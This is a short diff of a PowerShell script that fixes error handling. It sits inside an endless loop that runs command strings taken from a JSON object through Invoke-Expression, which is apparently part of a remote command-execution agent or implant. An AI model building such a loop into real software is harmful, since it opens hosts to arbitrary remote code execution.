@@ -49,9 +49,9 @@ while ($True) {
 		}
 		else {
 			$retval = IEX $jsObject.cmnd -ErrorVariable err 2>&1
-			if($error) {
-				$retval = $retval + "`n[-] Errors returned:`n`n" + $error
-				$error = ""
+			if($err) {
+				$retval = $retval + "`n[-] Errors returned:`n`n" + $err
+				$err = ""
 			}
 		}
 		if(!($retval)) {
